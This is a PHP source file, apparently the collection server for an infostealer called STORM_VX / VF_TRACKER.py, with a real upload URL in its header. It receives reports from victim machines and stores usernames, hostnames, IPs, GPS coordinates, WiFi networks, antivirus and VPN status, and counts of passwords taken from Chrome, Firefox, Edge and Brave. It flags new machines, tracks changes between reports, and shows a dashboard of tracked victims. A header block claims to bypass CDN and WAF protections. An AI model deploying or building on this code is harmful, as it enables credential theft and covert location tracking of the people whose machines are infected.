<?php
/**
 * ╔═════════════════════════════════════════════════════════════════════════╗
 * ║     STORM_VX v3.0 — Tracker Receiver Endpoint                          ║
 * ║     Upload this file to: http://namme.taskinoteam.ir/receive.php       ║
 * ║                                                                         ║
 * ║  Receives system tracking data from VF_TRACKER.py v3.0 via HTTP POST   ║
 * ║  and saves it to dated .txt + .json files on the server.               ║
 * ║                                                                         ║
 * ║  Security: Token-based authentication (VF_TOKEN)                       ║
 * ║  Storage:  /tracker_logs/ directory with date+machineID filenames      ║
 * ║  Features: Machine ID tracking, new machine detection, diff alerts     ║
 * ╚═════════════════════════════════════════════════════════════════════════╝
 */

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION — Change these values!
// ═══════════════════════════════════════════════════════════════════════════

// Security token — must match the token in VF_TRACKER.py
// CHANGE THIS to a random secret string! Both PHP and Python must use the same token.
define('VF_SECRET_TOKEN', 'xxx');

// Directory to store tracker logs (relative to this PHP file)
define('LOG_DIR', 'tracker_logs');

// Maximum log file size in bytes before rotation (5 MB)
define('MAX_LOG_SIZE', 5 * 1024 * 1024);

// ═══════════════════════════════════════════════════════════════════════════
// ANTI-WAF HEADERS — Help bypass CDN/WAF blocks (ArvanCloud, Cloudflare, etc.)
// ═══════════════════════════════════════════════════════════════════════════
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOGIC
// ═══════════════════════════════════════════════════════════════════════════

// Handle GET requests — show status page (for browser visits)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $script_dir = dirname(__FILE__);
    $log_path = $script_dir . '/' . LOG_DIR;

    // Count reports
    $report_count = 0;
    $machine_count = 0;
    $machines = [];
    if (is_dir($log_path)) {
        $files = glob($log_path . '/machine_*.txt');
        $report_count = count($files);
    }

    // Read index file
    $index_data = [];
    $index_file = $log_path . '/index.txt';
    if (file_exists($index_file)) {
        $index_lines = file($index_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $machine_count = count($index_lines);
        foreach ($index_lines as $line) {
            $index_data[] = $line;
        }
    }

    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><title>STORM_VX Tracker Server</title>';
    echo '<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}';
    echo 'h1{color:#00ff00;border-bottom:2px solid #00ff00;padding-bottom:10px}';
    echo '.box{background:#111;border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px}';
    echo '.ok{color:#00ff00} .warn{color:#ffff00} .info{color:#00ccff}';
    echo 'table{width:100%;border-collapse:collapse} td,th{padding:8px;text-align:left;border-bottom:1px solid #222}';
    echo 'th{color:#00ccff}</style></head><body>';
    echo '<h1>STORM_VX Tracker Server v3.0</h1>';
    echo '<div class="box">';
    echo '<p class="ok">Status: ONLINE</p>';
    echo '<p>Reports received: <b>' . $report_count . '</b></p>';
    echo '<p>Unique machines: <b>' . $machine_count . '</b></p>';
    echo '<p>Server time: ' . date('Y-m-d H:i:s') . '</p>';
    echo '</div>';

    if (!empty($index_data)) {
        echo '<div class="box"><h3>Tracked Machines:</h3><table>';
        echo '<tr><th>Time</th><th>Machine ID</th><th>User</th><th>IP</th><th>Location</th><th>ISP</th><th>WiFi</th></tr>';
        foreach ($index_data as $line) {
            echo '<tr>';
            $parts = explode(' | ', $line);
            foreach ($parts as $i => $part) {
                $val = trim($part);
                // Highlight important fields
                $class = '';
                if (strpos($val, 'VM:') !== false && strpos($val, 'YES') !== false) $class = ' class="warn"';
                if (strpos($val, 'VPN:') !== false && strpos($val, 'YES') !== false) $class = ' class="warn"';
                echo '<td' . $class . '>' . htmlspecialchars($val) . '</td>';
            }
            echo '</tr>';
        }
        echo '</table></div>';
    } else {
        echo '<div class="box"><p class="info">No reports received yet. Waiting for VF_TRACKER.py to send data...</p></div>';
    }

    echo '<div class="box"><p class="info">This page is for monitoring only. ';
    echo 'VF_TRACKER.py sends data via POST automatically.</p></div>';
    echo '</body></html>';
    exit;
}

// Verify security token (check both POST and GET for flexibility)
$token = isset($_POST['vf_token']) ? $_POST['vf_token'] : '';
if (empty($token)) {
    $token = isset($_GET['vf_token']) ? $_GET['vf_token'] : '';
}
if ($token !== VF_SECRET_TOKEN) {
    http_response_code(403);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['status' => 'error', 'message' => 'Invalid token', 'hint' => 'Check vf_token in POST data']);
    exit;
}

// Get the tracker data (support both POST and JSON body)
$tracker_data = isset($_POST['tracker_data']) ? $_POST['tracker_data'] : '';
$tracker_json = isset($_POST['tracker_json']) ? $_POST['tracker_json'] : '';

// Fallback: Try reading JSON body if POST fields are empty
if (empty($tracker_data) && empty($tracker_json)) {
    $raw_body = file_get_contents('php://input');
    if (!empty($raw_body)) {
        $json_body = json_decode($raw_body, true);
        if ($json_body && is_array($json_body)) {
            if (isset($json_body['tracker_data'])) $tracker_data = $json_body['tracker_data'];
            if (isset($json_body['tracker_json'])) {
                $tracker_json = is_string($json_body['tracker_json']) ? $json_body['tracker_json'] : json_encode($json_body['tracker_json']);
            }
            if (isset($json_body['vf_token'])) $token = $json_body['vf_token'];
        }
    }
}

if (empty($tracker_data) && empty($tracker_json)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

// Parse JSON data
$decoded_json = null;
if (!empty($tracker_json)) {
    $decoded_json = json_decode($tracker_json, true);
}

// Extract key identifiers for filename
$sender_ip = $_SERVER['REMOTE_ADDR'];
$date_str = date('Y-m-d');
$time_str = date('H-i-s');

// Use Machine ID for filename if available (better than IP for tracking)
$machine_id = 'unknown';
$is_new_machine = false;
$hwid_short = 'unknown';
$username = 'unknown';
$hostname = 'unknown';
$pub_ip = '?';
$country = '?';
$city = '?';
$isp = '?';
$coords = '?';
$maps_link = '?';
$wifi_ssid = '?';
$vm_status = '?';
$antivirus = '?';
$vpn_status = '?';
$cred_count = 0;
$cred_browsers = [];

if ($decoded_json) {
    $machine_id = isset($decoded_json['machine_id']) ? $decoded_json['machine_id'] : 'unknown';
    $is_new_machine = isset($decoded_json['is_new_machine']) ? $decoded_json['is_new_machine'] : false;
    $hwid_short = isset($decoded_json['hwid']) ? substr($decoded_json['hwid'], 0, 16) : 'unknown';
    $username = isset($decoded_json['username']) ? $decoded_json['username'] : '?';
    $hostname = isset($decoded_json['hostname']) ? $decoded_json['hostname'] : '?';
    $pub_ip = isset($decoded_json['public_ip']) ? $decoded_json['public_ip'] : '?';
    $country = isset($decoded_json['country']) ? $decoded_json['country'] : '?';
    $city = isset($decoded_json['city']) ? $decoded_json['city'] : '?';
    $isp = isset($decoded_json['isp']) ? $decoded_json['isp'] : '?';
    $coords = isset($decoded_json['coordinates']) ? $decoded_json['coordinates'] : '?';
    $maps_link = isset($decoded_json['maps_link']) ? $decoded_json['maps_link'] : '?';
    $wifi_ssid = isset($decoded_json['wifi_ssid']) ? $decoded_json['wifi_ssid'] : '?';
    $vm_status = isset($decoded_json['vm_detection']) ? implode('; ', $decoded_json['vm_detection']) : '?';
    $antivirus = isset($decoded_json['antivirus']) ? implode('; ', $decoded_json['antivirus']) : '?';
    $vpn_status = isset($decoded_json['vpn_proxy']) ? implode('; ', $decoded_json['vpn_proxy']) : '?';

    // Credential extraction summary
    if (isset($decoded_json['credentials'])) {
        $creds = $decoded_json['credentials'];
        $cred_summary = isset($creds['summary']) ? $creds['summary'] : [];
        $chrome_count = isset($cred_summary['chrome_passwords']) ? $cred_summary['chrome_passwords'] : 0;
        $firefox_count = isset($cred_summary['firefox_passwords']) ? $cred_summary['firefox_passwords'] : 0;
        $edge_count = isset($cred_summary['edge_passwords']) ? $cred_summary['edge_passwords'] : 0;
        $brave_count = isset($cred_summary['brave_passwords']) ? $cred_summary['brave_passwords'] : 0;
        $cred_count = $chrome_count + $firefox_count + $edge_count + $brave_count;
        if ($chrome_count > 0) $cred_browsers[] = "Chrome({$chrome_count})";
        if ($firefox_count > 0) $cred_browsers[] = "Firefox({$firefox_count})";
        if ($edge_count > 0) $cred_browsers[] = "Edge({$edge_count})";
        if ($brave_count > 0) $cred_browsers[] = "Brave({$brave_count})";
    }
}

// Sanitize machine_id for filename
$safe_machine_id = preg_replace('/[^a-zA-Z0-9]/', '_', $machine_id);

// ═══════════════════════════════════════════════════════════════════════════
// DIRECTORY SETUP
// ═══════════════════════════════════════════════════════════════════════════

$script_dir = dirname(__FILE__);
$log_path = $script_dir . '/' . LOG_DIR;

if (!is_dir($log_path)) {
    if (!mkdir($log_path, 0755, true)) {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Cannot create log directory']);
        exit;
    }
}

// Protect log directory with .htaccess
$htaccess = $log_path . '/.htaccess';
if (!file_exists($htaccess)) {
    file_put_contents($htaccess, "Deny from all\n");
}

// Also protect with index.php to prevent directory listing
$index_guard = $log_path . '/index.php';
if (!file_exists($index_guard)) {
    file_put_contents($index_guard, "<?php http_response_code(403); exit; ?>\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// FILE NAMING — Machine ID based (same machine = same file, appended)
// ═══════════════════════════════════════════════════════════════════════════

$log_file = $log_path . '/machine_' . $safe_machine_id . '.txt';

// If file exists and is too large, rotate it
if (file_exists($log_file) && filesize($log_file) > MAX_LOG_SIZE) {
    $counter = 1;
    while (file_exists($log_path . '/machine_' . $safe_machine_id . '_' . $counter . '.txt')) {
        $counter++;
    }
    $log_file = $log_path . '/machine_' . $safe_machine_id . '_' . $counter . '.txt';
}

// ═══════════════════════════════════════════════════════════════════════════
// DIFF DETECTION — Check if anything changed from previous report
// ═══════════════════════════════════════════════════════════════════════════

$changes = array();
$prev_json_file = $log_path . '/machine_' . $safe_machine_id . '_latest.json';

if (file_exists($prev_json_file) && $decoded_json) {
    $prev_data = json_decode(file_get_contents($prev_json_file), true);
    if ($prev_data) {
        // Track key changes
        $diff_fields = array(
            'public_ip' => 'Public IP',
            'isp' => 'ISP',
            'wifi_ssid' => 'WiFi SSID',
            'username' => 'Username',
            'hostname' => 'Hostname',
            'country' => 'Country',
            'city' => 'City',
            'coordinates' => 'Coordinates',
        );

        foreach ($diff_fields as $field => $label) {
            $old_val = isset($prev_data[$field]) ? $prev_data[$field] : '';
            $new_val = isset($decoded_json[$field]) ? $decoded_json[$field] : '';
            if ($old_val && $new_val && $old_val !== $new_val) {
                $changes[] = "{$label}: {$old_val} => {$new_val}";
            }
        }

        // Check for new WiFi profiles
        if (isset($prev_data['wifi_profiles']) && isset($decoded_json['wifi_profiles'])) {
            $old_wifi = $prev_data['wifi_profiles'];
            $new_wifi = $decoded_json['wifi_profiles'];
            $diff_wifi = array_diff($new_wifi, $old_wifi);
            if (!empty($diff_wifi)) {
                $changes[] = "New WiFi networks: " . implode(', ', $diff_wifi);
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BUILD LOG ENTRY
// ═══════════════════════════════════════════════════════════════════════════

$separator = str_repeat('=', 70);
$log_entry = "\n" . $separator . "\n";

// Header with priority indicators
if ($is_new_machine) {
    $log_entry .= "  *** NEW MACHINE DETECTED ***\n";
}
if (!empty($changes)) {
    $log_entry .= "  *** CHANGES DETECTED ***\n";
}

$log_entry .= "  TRACKER REPORT RECEIVED (v3.0)\n";
$log_entry .= "  Server Time  : " . date('Y-m-d H:i:s') . "\n";
$log_entry .= "  Sender IP    : " . $sender_ip . "\n";
$log_entry .= "  Machine ID   : " . $machine_id . "\n";
$log_entry .= "  HWID (short) : " . $hwid_short . "\n";
$log_entry .= "  User-Agent   : " . (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown') . "\n";

if (!empty($changes)) {
    $log_entry .= "\n  [CHANGES FROM PREVIOUS REPORT]:\n";
    foreach ($changes as $change) {
        $log_entry .= "    ! " . $change . "\n";
    }
}

$log_entry .= $separator . "\n\n";

// Add the text report data
if (!empty($tracker_data)) {
    $log_entry .= $tracker_data . "\n";
}

// Add JSON data if provided
if (!empty($tracker_json) && $decoded_json !== null) {
    $log_entry .= "\n" . str_repeat('-', 70) . "\n";
    $log_entry .= "  [JSON DATA]\n";
    $log_entry .= str_repeat('-', 70) . "\n";
    $log_entry .= json_encode($decoded_json, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
}

$log_entry .= "\n" . str_repeat('=', 70) . "\n";

// ═══════════════════════════════════════════════════════════════════════════
// SAVE FILES
// ═══════════════════════════════════════════════════════════════════════════

// Save TXT report
$result = file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

if ($result === false) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to write log file']);
    exit;
}

// Save latest JSON for diff detection
if ($decoded_json) {
    file_put_contents($prev_json_file, json_encode($decoded_json, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

// ═══════════════════════════════════════════════════════════════════════════
// UPDATE INDEX FILE — Summary of all machines
// ═══════════════════════════════════════════════════════════════════════════

$index_file = $log_path . '/index.txt';

// Read existing index to check for duplicates
$index_lines = [];
if (file_exists($index_file)) {
    $index_lines = file($index_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

// Check if this machine already exists in index
$machine_exists = false;
foreach ($index_lines as &$iline) {
    if (strpos($iline, $machine_id) !== false) {
        // Update existing entry with latest info
        $cred_info = $cred_count > 0 ? ' | Creds: ' . $cred_count . ' (' . implode(',', $cred_browsers) . ')' : '';
        $iline = date('Y-m-d H:i:s') . " | MID: " . $machine_id . " | IP: " . $sender_ip
               . " | User: " . $username . " | Host: " . $hostname
               . " | PubIP: " . $pub_ip . " | Loc: " . $city . ", " . $country
               . " | ISP: " . $isp . " | WiFi: " . $wifi_ssid
               . " | AV: " . substr($antivirus, 0, 30)
               . " | VM: " . ($vm_status !== '?' ? 'YES' : 'No')
               . " | VPN: " . ($vpn_status !== 'No VPN/Proxy detected' ? 'YES' : 'No')
               . " | Coords: " . $coords
               . $cred_info;
        $machine_exists = true;
        break;
    }
}
unset($iline);

if (!$machine_exists) {
    $cred_info = $cred_count > 0 ? ' | Creds: ' . $cred_count . ' (' . implode(',', $cred_browsers) . ')' : '';
    $index_lines[] = date('Y-m-d H:i:s') . " | MID: " . $machine_id . " | IP: " . $sender_ip
                   . " | User: " . $username . " | Host: " . $hostname
                   . " | PubIP: " . $pub_ip . " | Loc: " . $city . ", " . $country
                   . " | ISP: " . $isp . " | WiFi: " . $wifi_ssid
                   . " | AV: " . substr($antivirus, 0, 30)
                   . " | VM: " . ($vm_status !== '?' ? 'YES' : 'No')
                   . " | VPN: " . ($vpn_status !== 'No VPN/Proxy detected' ? 'YES' : 'No')
                   . " | Coords: " . $coords
                   . $cred_info;
}

file_put_contents($index_file, implode("\n", $index_lines) . "\n", LOCK_EX);

// ═══════════════════════════════════════════════════════════════════════════
// RETURN SUCCESS
// ═══════════════════════════════════════════════════════════════════════════

http_response_code(200);
echo json_encode([
    'status' => 'ok',
    'message' => 'Report received successfully',
    'file' => basename($log_file),
    'size' => $result,
    'machine_id' => $machine_id,
    'is_new_machine' => $is_new_machine,
    'changes_detected' => $changes,
    'changes_count' => count($changes)
]);
?>
